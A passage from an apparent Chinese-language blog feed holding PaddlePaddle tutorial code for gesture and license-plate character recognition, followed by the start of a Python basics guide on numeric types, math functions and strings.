fluid.dygraph.guard():</span><br><span class="line">    accs = []</span><br><span class="line">    model_dict, _ = fluid.load_dygraph(<span class="string">&#x27;MyDNN&#x27;</span>)</span><br><span class="line">    model = MyDNN()</span><br><span class="line">    model.load_dict(model_dict) <span class="comment">#加载模型参数</span></span><br><span class="line">    model.<span class="built_in">eval</span>() <span class="comment">#训练模式</span></span><br><span class="line">    <span class="keyword">for</span> batch_id,data <span class="keyword">in</span> <span class="built_in">enumerate</span>(test_reader()):<span class="comment">#测试集</span></span><br><span class="line">        images=np.array([x[<span class="number">0</span>].reshape(<span class="number">3</span>,<span class="number">100</span>,<span class="number">100</span>) <span class="keyword">for</span> x <span class="keyword">in</span> data],np.float32)</span><br><span class="line">        labels = np.array([x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> data]).astype(<span class="string">&#x27;int64&#x27;</span>)</span><br><span class="line">        labels = labels[:, np.newaxis]</span><br><span class="line"></span><br><span class="line">        image=fluid.dygraph.to_variable(images)</span><br><span class="line">        label=fluid.dygraph.to_variable(labels)</span><br><span class="line">        </span><br><span class="line">        predict=model(image)       </span><br><span class="line">        acc=fluid.layers.accuracy(predict,label)</span><br><span class="line">        accs.append(acc.numpy()[<span class="number">0</span>])</span><br><span class="line">        avg_acc = np.mean(accs)</span><br><span class="line">    <span class="built_in">print</span>(avg_acc)</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取预测图像，进行预测</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_image</span>(<span class="params">path</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(path)</span><br><span class="line">    img = img.resize((<span class="number">100</span>, <span class="number">100</span>), Image.ANTIALIAS)</span><br><span class="line">    img = np.array(img).astype(<span class="string">&#x27;float32&#x27;</span>)</span><br><span class="line">    img = img.transpose((<span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">    img = img/<span class="number">255.0</span></span><br><span class="line">    <span class="built_in">print</span>(img.shape)</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"><span class="comment">#构建预测动态图过程</span></span><br><span class="line"><span class="keyword">with</span> fluid.dygraph.guard():</span><br><span class="line">    infer_path = <span class="string">&#x27;手势.JPG&#x27;</span></span><br><span class="line">    model=MyDNN()<span class="comment">#模型实例化</span></span><br><span class="line">    model_dict,_=fluid.load_dygraph(<span class="string">&#x27;MyDNN&#x27;</span>)</span><br><span class="line">    model.load_dict(model_dict)<span class="comment">#加载模型参数</span></span><br><span class="line">    model.<span class="built_in">eval</span>()<span class="comment">#评估模式</span></span><br><span class="line">    infer_img = load_image(infer_path)</span><br><span class="line">    infer_img=np.array(infer_img).astype(<span class="string">&#x27;float32&#x27;</span>)</span><br><span class="line">    infer_img=infer_img[np.newaxis,:, : ,:]</span><br><span class="line">    infer_img = fluid.dygraph.to_variable(infer_img)</span><br><span class="line">    result=model(infer_img)</span><br><span class="line">    display(Image.<span class="built_in">open</span>(<span class="string">&#x27;手势.JPG&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(np.argmax(result.numpy()))</span><br></pre></td></tr></table></figure>

<h2 id="车牌识别"><a href="#车牌识别" class="headerlink" title="车牌识别"></a>车牌识别</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#导入需要的包</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> paddle <span class="keyword">as</span> paddle</span><br><span class="line"><span class="keyword">import</span> paddle.fluid <span class="keyword">as</span> fluid</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> cpu_count</span><br><span class="line"><span class="keyword">from</span> paddle.fluid.dygraph <span class="keyword">import</span> Pool2D,Conv2D</span><br><span class="line"><span class="comment"># from paddle.fluid.dygraph import FC</span></span><br><span class="line"><span class="keyword">from</span> paddle.fluid.dygraph <span class="keyword">import</span> Linear</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成车牌字符图像列表</span></span><br><span class="line">data_path = <span class="string">&#x27;/home/aistudio/data&#x27;</span></span><br><span class="line">character_folders = os.listdir(data_path)</span><br><span class="line">label = <span class="number">0</span></span><br><span class="line">LABEL_temp = &#123;&#125;</span><br><span class="line"><span class="keyword">if</span>(os.path.exists(<span class="string">&#x27;./train_data.list&#x27;</span>)):</span><br><span class="line">    os.remove(<span class="string">&#x27;./train_data.list&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span>(os.path.exists(<span class="string">&#x27;./test_data.list&#x27;</span>)):</span><br><span class="line">    os.remove(<span class="string">&#x27;./test_data.list&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> character_folder <span class="keyword">in</span> character_folders:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./train_data.list&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f_train:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./test_data.list&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f_test:</span><br><span class="line">            <span class="keyword">if</span> character_folder == <span class="string">&#x27;.DS_Store&#x27;</span> <span class="keyword">or</span> character_folder == <span class="string">&#x27;.ipynb_checkpoints&#x27;</span> <span class="keyword">or</span> character_folder == <span class="string">&#x27;data23617&#x27;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="built_in">print</span>(character_folder + <span class="string">&quot; &quot;</span> + <span class="built_in">str</span>(label))</span><br><span class="line">            LABEL_temp[<span class="built_in">str</span>(label)] = character_folder <span class="comment">#存储一下标签的对应关系</span></span><br><span class="line">            character_imgs = os.listdir(os.path.join(data_path, character_folder))</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(character_imgs)):</span><br><span class="line">                <span class="keyword">if</span> i%<span class="number">10</span> == <span class="number">0</span>: </span><br><span class="line">                    f_test.write(os.path.join(os.path.join(data_path, character_folder), character_imgs[i]) + <span class="string">&quot;\t&quot;</span> + <span class="built_in">str</span>(label) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    f_train.write(os.path.join(os.path.join(data_path, character_folder), character_imgs[i]) + <span class="string">&quot;\t&quot;</span> + <span class="built_in">str</span>(label) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    label = label + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;图像列表已生成&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用上一步生成的图像列表定义车牌字符训练集和测试集的reader</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">data_mapper</span>(<span class="params">sample</span>):</span><br><span class="line">    img, label = sample</span><br><span class="line">    img = paddle.dataset.image.load_image(file=img, is_color=<span class="literal">False</span>)</span><br><span class="line">    img = img.flatten().astype(<span class="string">&#x27;float32&#x27;</span>) / <span class="number">255.0</span></span><br><span class="line">    <span class="keyword">return</span> img, label</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">data_reader</span>(<span class="params">data_list_path</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reader</span>():</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(data_list_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            lines = f.readlines()</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">                img, label = line.split(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">                <span class="keyword">yield</span> img, <span class="built_in">int</span>(label)</span><br><span class="line">    <span class="keyword">return</span> paddle.reader.xmap_readers(data_mapper, reader, cpu_count(), <span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于训练的数据提供器</span></span><br><span class="line">train_reader = paddle.batch(reader=paddle.reader.shuffle(reader=data_reader(<span class="string">&#x27;./train_data.list&#x27;</span>), buf_size=<span class="number">512</span>), batch_size=<span class="number">128</span>)</span><br><span class="line"><span class="comment"># 用于测试的数据提供器</span></span><br><span class="line">test_reader = paddle.batch(reader=data_reader(<span class="string">&#x27;./test_data.list&#x27;</span>), batch_size=<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义网络</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLeNet</span>(fluid.dygraph.Layer):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(MyLeNet,self).__init__()</span><br><span class="line">        self.hidden1_1 = Conv2D(<span class="number">1</span>, <span class="number">28</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line">        self.hidden1_2 = Pool2D(pool_size=<span class="number">2</span>, pool_type=<span class="string">&quot;max&quot;</span>, pool_stride=<span class="number">1</span>)</span><br><span class="line">        self.hidden2_1 = Conv2D(<span class="number">28</span>, <span class="number">32</span>, <span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line">        self.hidden2_2 = Pool2D(pool_size=<span class="number">2</span>, pool_type=<span class="string">&quot;max&quot;</span>, pool_stride=<span class="number">1</span>)</span><br><span class="line">        self.hidden3 = Conv2D(<span class="number">32</span>, <span class="number">32</span>, <span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line">        self.hidden4 = Linear(<span class="number">32</span>*<span class="number">10</span>*<span class="number">10</span>, <span class="number">65</span>, act=<span class="string">&quot;softmax&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self,<span class="built_in">input</span></span>):</span><br><span class="line">        x = self.hidden1_1(<span class="built_in">input</span>)</span><br><span class="line">        x = self.hidden1_2(x)</span><br><span class="line">        x = self.hidden2_1(x)</span><br><span class="line">        x = self.hidden2_2(x)</span><br><span class="line">        x = self.hidden3(x)</span><br><span class="line">        x = fluid.layers.reshape(x, shape=[-<span class="number">1</span>, <span class="number">32</span>*<span class="number">10</span>*<span class="number">10</span>])</span><br><span class="line">        y = self.hidden4(x)</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> fluid.dygraph.guard():</span><br><span class="line">    lr = <span class="number">0.005</span></span><br><span class="line">    model=MyLeNet() <span class="comment">#模型实例化</span></span><br><span class="line">    model.train() <span class="comment">#训练模式</span></span><br><span class="line">    opt=fluid.optimizer.SGDOptimizer(learning_rate=<span class="number">0.001</span>, parameter_list=model.parameters())<span class="comment">#优化器选用SGD随机梯度下降，学习率为0.001.</span></span><br><span class="line">    epochs_num=<span class="number">100</span> <span class="comment">#迭代次数为2</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pass_num <span class="keyword">in</span> <span class="built_in">range</span>(epochs_num):</span><br><span class="line">        <span class="keyword">if</span> pass_num &gt; <span class="number">10</span>:</span><br><span class="line">            lr = <span class="number">0.002</span></span><br><span class="line">        <span class="keyword">if</span> pass_num &gt; <span class="number">30</span>:</span><br><span class="line">            lr = <span class="number">0.001</span></span><br><span class="line">        <span class="keyword">if</span> pass_num &gt; <span class="number">60</span>:</span><br><span class="line">            lr = <span class="number">0.0005</span></span><br><span class="line">        <span class="keyword">for</span> batch_id,data <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_reader()):</span><br><span class="line">            images=np.array([x[<span class="number">0</span>].reshape(<span class="number">1</span>,<span class="number">20</span>,<span class="number">20</span>) <span class="keyword">for</span> x <span class="keyword">in</span> data],np.float32)</span><br><span class="line">            labels = np.array([x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> data]).astype(<span class="string">&#x27;int64&#x27;</span>)</span><br><span class="line">            labels = labels[:, np.newaxis]</span><br><span class="line">            image=fluid.dygraph.to_variable(images)</span><br><span class="line">            label=fluid.dygraph.to_variable(labels)</span><br><span class="line">            </span><br><span class="line">            predict=model(image)<span class="comment">#预测</span></span><br><span class="line">            </span><br><span class="line">            loss=fluid.layers.cross_entropy(predict,label)</span><br><span class="line">            avg_loss=fluid.layers.mean(loss)<span class="comment">#获取loss值</span></span><br><span class="line">            </span><br><span class="line">            acc=fluid.layers.accuracy(predict,label)<span class="comment">#计算精度</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> batch_id!=<span class="number">0</span> <span class="keyword">and</span> batch_id%<span class="number">50</span>==<span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;train_pass:&#123;&#125;,batch_id:&#123;&#125;,train_loss:&#123;&#125;,train_acc:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(pass_num,batch_id,avg_loss.numpy(),acc.numpy()))</span><br><span class="line">            </span><br><span class="line">            avg_loss.backward()</span><br><span class="line">            opt.minimize(avg_loss)</span><br><span class="line">            model.clear_gradients()            </span><br><span class="line">            </span><br><span class="line">    fluid.save_dygraph(model.state_dict(),<span class="string">&#x27;MyLeNet&#x27;</span>)<span class="comment">#保存模型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#模型校验</span></span><br><span class="line"><span class="keyword">with</span> fluid.dygraph.guard():</span><br><span class="line">    accs = []</span><br><span class="line">    model=MyLeNet()<span class="comment">#模型实例化</span></span><br><span class="line">    model_dict,_=fluid.load_dygraph(<span class="string">&#x27;MyLeNet&#x27;</span>)</span><br><span class="line">    model.load_dict(model_dict)<span class="comment">#加载模型参数</span></span><br><span class="line">    model.<span class="built_in">eval</span>()<span class="comment">#评估模式</span></span><br><span class="line">    <span class="keyword">for</span> batch_id,data <span class="keyword">in</span> <span class="built_in">enumerate</span>(test_reader()):<span class="comment">#测试集</span></span><br><span class="line">        images=np.array([x[<span class="number">0</span>].reshape(<span class="number">1</span>,<span class="number">20</span>,<span class="number">20</span>) <span class="keyword">for</span> x <span class="keyword">in</span> data],np.float32)</span><br><span class="line">        labels = np.array([x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> data]).astype(<span class="string">&#x27;int64&#x27;</span>)</span><br><span class="line">        labels = labels[:, np.newaxis]</span><br><span class="line">            </span><br><span class="line">        image=fluid.dygraph.to_variable(images)</span><br><span class="line">        label=fluid.dygraph.to_variable(labels)</span><br><span class="line">            </span><br><span class="line">        predict=model(image)<span class="comment">#预测</span></span><br><span class="line">        acc=fluid.layers.accuracy(predict,label)</span><br><span class="line">        accs.append(acc.numpy()[<span class="number">0</span>])</span><br><span class="line">        avg_acc = np.mean(accs)</span><br><span class="line">    <span class="built_in">print</span>(avg_acc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对车牌图片进行处理，分割出车牌中的每一个字符并保存</span></span><br><span class="line">license_plate = cv2.imread(<span class="string">&#x27;./车牌.png&#x27;</span>)</span><br><span class="line">gray_plate = cv2.cvtColor(license_plate, cv2.COLOR_RGB2GRAY)</span><br><span class="line">ret, binary_plate = cv2.threshold(gray_plate, <span class="number">175</span>, <span class="number">255</span>, cv2.THRESH_BINARY)</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(binary_plate.shape[<span class="number">1</span>]):</span><br><span class="line">    result.append(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(binary_plate.shape[<span class="number">0</span>]):</span><br><span class="line">        result[col] = result[col] + binary_plate[row][col]/<span class="number">255</span></span><br><span class="line">character_dict = &#123;&#125;</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(result):</span><br><span class="line">    <span class="keyword">if</span> result[i] == <span class="number">0</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        index = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> result[index] != <span class="number">0</span>:</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        character_dict[num] = [i, index-<span class="number">1</span>]</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">        i = index</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    padding = (<span class="number">170</span> - (character_dict[i][<span class="number">1</span>] - character_dict[i][<span class="number">0</span>])) / <span class="number">2</span></span><br><span class="line">    ndarray = np.pad(binary_plate[:,character_dict[i][<span class="number">0</span>]:character_dict[i][<span class="number">1</span>]], ((<span class="number">0</span>,<span class="number">0</span>), (<span class="built_in">int</span>(padding), <span class="built_in">int</span>(padding))), <span class="string">&#x27;constant&#x27;</span>, constant_values=(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    ndarray = cv2.resize(ndarray, (<span class="number">20</span>,<span class="number">20</span>))</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;./&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;.png&#x27;</span>, ndarray)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_image</span>(<span class="params">path</span>):</span><br><span class="line">    img = paddle.dataset.image.load_image(file=path, is_color=<span class="literal">False</span>)</span><br><span class="line">    img = img.astype(<span class="string">&#x27;float32&#x27;</span>)</span><br><span class="line">    img = img[np.newaxis, ] / <span class="number">255.0</span></span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"><span class="comment">#将标签进行转换</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Label:&#x27;</span>,LABEL_temp)</span><br><span class="line"><span class="keyword">match</span> = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>:<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>:<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>:<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>:<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>:<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>:<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>:<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>:<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>:<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>:<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>:<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>:<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>:<span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;O&#x27;</span>:<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>:<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>:<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>:<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>:<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>:<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>:<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>:<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>:<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>:<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>:<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>:<span class="string">&#x27;Z&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;yun&#x27;</span>:<span class="string">&#x27;云&#x27;</span>,<span class="string">&#x27;cuan&#x27;</span>:<span class="string">&#x27;川&#x27;</span>,<span class="string">&#x27;hei&#x27;</span>:<span class="string">&#x27;黑&#x27;</span>,<span class="string">&#x27;zhe&#x27;</span>:<span class="string">&#x27;浙&#x27;</span>,<span class="string">&#x27;ning&#x27;</span>:<span class="string">&#x27;宁&#x27;</span>,<span class="string">&#x27;jin&#x27;</span>:<span class="string">&#x27;津&#x27;</span>,<span class="string">&#x27;gan&#x27;</span>:<span class="string">&#x27;赣&#x27;</span>,<span class="string">&#x27;hu&#x27;</span>:<span class="string">&#x27;沪&#x27;</span>,<span class="string">&#x27;liao&#x27;</span>:<span class="string">&#x27;辽&#x27;</span>,<span class="string">&#x27;jl&#x27;</span>:<span class="string">&#x27;吉&#x27;</span>,<span class="string">&#x27;qing&#x27;</span>:<span class="string">&#x27;青&#x27;</span>,<span class="string">&#x27;zang&#x27;</span>:<span class="string">&#x27;藏&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;e1&#x27;</span>:<span class="string">&#x27;鄂&#x27;</span>,<span class="string">&#x27;meng&#x27;</span>:<span class="string">&#x27;蒙&#x27;</span>,<span class="string">&#x27;gan1&#x27;</span>:<span class="string">&#x27;甘&#x27;</span>,<span class="string">&#x27;qiong&#x27;</span>:<span class="string">&#x27;琼&#x27;</span>,<span class="string">&#x27;shan&#x27;</span>:<span class="string">&#x27;陕&#x27;</span>,<span class="string">&#x27;min&#x27;</span>:<span class="string">&#x27;闽&#x27;</span>,<span class="string">&#x27;su&#x27;</span>:<span class="string">&#x27;苏&#x27;</span>,<span class="string">&#x27;xin&#x27;</span>:<span class="string">&#x27;新&#x27;</span>,<span class="string">&#x27;wan&#x27;</span>:<span class="string">&#x27;皖&#x27;</span>,<span class="string">&#x27;jing&#x27;</span>:<span class="string">&#x27;京&#x27;</span>,<span class="string">&#x27;xiang&#x27;</span>:<span class="string">&#x27;湘&#x27;</span>,<span class="string">&#x27;gui&#x27;</span>:<span class="string">&#x27;贵&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;yu1&#x27;</span>:<span class="string">&#x27;渝&#x27;</span>,<span class="string">&#x27;yu&#x27;</span>:<span class="string">&#x27;豫&#x27;</span>,<span class="string">&#x27;ji&#x27;</span>:<span class="string">&#x27;冀&#x27;</span>,<span class="string">&#x27;yue&#x27;</span>:<span class="string">&#x27;粤&#x27;</span>,<span class="string">&#x27;gui1&#x27;</span>:<span class="string">&#x27;桂&#x27;</span>,<span class="string">&#x27;sx&#x27;</span>:<span class="string">&#x27;晋&#x27;</span>,<span class="string">&#x27;lu&#x27;</span>:<span class="string">&#x27;鲁&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;0&#x27;</span>:<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>:<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>:<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>:<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>:<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>:<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>:<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>:<span class="string">&#x27;9&#x27;</span>&#125;</span><br><span class="line">L = <span class="number">0</span></span><br><span class="line">LABEL =&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> V <span class="keyword">in</span> LABEL_temp.values():</span><br><span class="line">    LABEL[<span class="built_in">str</span>(L)] = <span class="keyword">match</span>[V]</span><br><span class="line">    L += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(LABEL)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构建预测动态图过程</span></span><br><span class="line"><span class="keyword">with</span> fluid.dygraph.guard():</span><br><span class="line">    model=MyLeNet()<span class="comment">#模型实例化</span></span><br><span class="line">    model_dict,_=fluid.load_dygraph(<span class="string">&#x27;MyLeNet&#x27;</span>)</span><br><span class="line">    model.load_dict(model_dict)<span class="comment">#加载模型参数</span></span><br><span class="line">    model.<span class="built_in">eval</span>()<span class="comment">#评估模式</span></span><br><span class="line">    lab=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        infer_imgs = []</span><br><span class="line">        infer_imgs.append(load_image(<span class="string">&#x27;./&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;.png&#x27;</span>))</span><br><span class="line">        infer_imgs = np.array(infer_imgs)</span><br><span class="line">        infer_imgs = fluid.dygraph.to_variable(infer_imgs)</span><br><span class="line">        result=model(infer_imgs)</span><br><span class="line">        lab.append(np.argmax(result.numpy()))</span><br><span class="line"><span class="comment"># print(lab)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">display(Image.<span class="built_in">open</span>(<span class="string">&#x27;./车牌.png&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n车牌识别结果为：&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(lab)):</span><br><span class="line">    <span class="built_in">print</span>(LABEL[<span class="built_in">str</span>(lab[i])],end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>AI</tag>
        <tag>百度</tag>
        <tag>PaddlePaddle</tag>
      </tags>
  </entry>
  <entry>
    <title>Python</title>
    <url>/2020/02/09/Python/Python/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>


<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h3><p>数字型包括：</p>
<ul>
<li>int：20</li>
<li>float：3.3</li>
<li>bool：True（True &#x3D; 1, False &#x3D; 0）</li>
<li>complex：4+2j, complex(4, 2)</li>
</ul>
<p>运算方式有：加(<code>+</code>)，减(<code>-</code>)，乘(<code>*</code>)，除-浮点(<code>/</code>)，除-整数(<code>//</code>)，取余(<code>%</code>)，乘方(<code>**</code>)</p>
<p>常用方法：</p>
<ul>
<li>range(n)：产生一个从0到n的序列。</li>
<li>range(m, n)：产生一个从m到n的序列。</li>
<li>sum()：对列表的所有元素求和</li>
<li>all()：判断列表中所有元素是否都是True</li>
<li>any()：判断列表中是否包含True</li>
</ul>
<p>运算方法：</p>
<ul>
<li>abs()</li>
<li>max()：参数可以为序列。</li>
<li>min()：参数可以为序列。</li>
<li>pow()：乘幂运算。</li>
<li>round()：四舍五入，可以指定小数点后的位数。</li>
<li>math.ceil()：向上取整。</li>
<li>math.floor()：向下取整。</li>
<li>math.exp()</li>
<li>math.fabs()</li>
<li>math.log()</li>
<li>math.log10()</li>
<li>math.modf()：返回小数部分和整数部分（元组，先小数，后整数）。</li>
<li>math.sqrt()</li>
<li>math.pi：内置常量，PI</li>
<li>math.e：内置常量，E</li>
</ul>
<p>随机函数：</p>
<ul>
<li>random.choice()：从给定的序列中随机选择一个元素。</li>
<li>random.randrange([start,] stop [, step])：在指定范围内按照基数底层的集合中获取一个随机数。基数默认为1。</li>
<li>random.random()：生成一个0到1之间的实数。</li>
<li>random.seed()：改变种子生成器。</li>
<li>random.shuffle()：将给定的序列随机排列。</li>
<li>random.uniform(x, y)：生成一个x到y之间的实数。</li>
</ul>
<h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>可以使用<code>&#39;inline&#39;</code>、<code>&quot;inline&quot;</code>、<code>&#39;&#39;&#39;multi lines&#39;&#39;&#39;</code>方式。 可以使用转义字符。 索引从前面开始为<code>0</code>；从后面开始为<code>-1</code>。 字符串只读，不能修改某一个字符。</p>
<p>运算方式有（设<code>str_a=&quot;123456789&quot;</code>）：</p>
<ul>
<li>加(<code>str_a + str_b</code>)：字符串拼接。</li>
<li>乘(<code>str_a * 2</code>)：字符串重复。</li>
<li>切片(<code>str_a[0:-1]</code>, <code>str_a[3:]</code>)：返回字串”12345678”，”456789”，遵循左闭右开。</li>
<li>禁用转义字符(<code>r&#39;\n&#39;</code>)：返回”\n”，R作用一以。</li>
<li>in：查看是否在其中。</li>
<li>not in</li>
<li>%：格式字符串</li>
</ul>
<table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
<th>字符</th>
<th>描述</th>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>\</code></td>
<td>续行</td>
<td><code>\\</code></td>
<td>反斜线</td>
<td><code>\&#39;</code></td>
<td>单引号</td>
</tr>
<tr>
<td><code>\&quot;</code></td>
<td>双引号</td>
<td><code>\a</code></td>
<td>响铃</td>
<td><code>\b</code></td>
<td>退格</td>
</tr>
<tr>
